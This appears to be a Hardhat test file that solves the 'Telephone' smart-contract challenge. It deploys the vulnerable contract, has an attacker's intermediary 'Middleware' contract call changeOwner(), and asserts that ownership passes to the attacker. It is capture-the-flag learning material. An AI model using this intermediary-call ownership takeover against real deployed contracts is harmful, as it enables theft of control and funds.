import { expect } from "chai";
import { ethers } from "hardhat";

const { utils } = ethers;

describe("Telephone", () => {
  it("Solves the challenge", async () => {
    const [deployer, attacker] = await ethers.getSigners()
    const telephoneContractFactory = await ethers.getContractFactory("Telephone")
    const telephoneContract = await telephoneContractFactory.connect(deployer).deploy()
    await telephoneContract.deployed()

    const middlewareContractFactory = await ethers.getContractFactory("Middleware")
    const middlewareContract = await middlewareContractFactory.connect(attacker).deploy(telephoneContract.address)
    await middlewareContract.deployed()

    const tx = await middlewareContract.connect(attacker).changeOwner()
    await tx.wait()

    expect(await telephoneContract.owner()).to.eq(attacker.address)
  });
});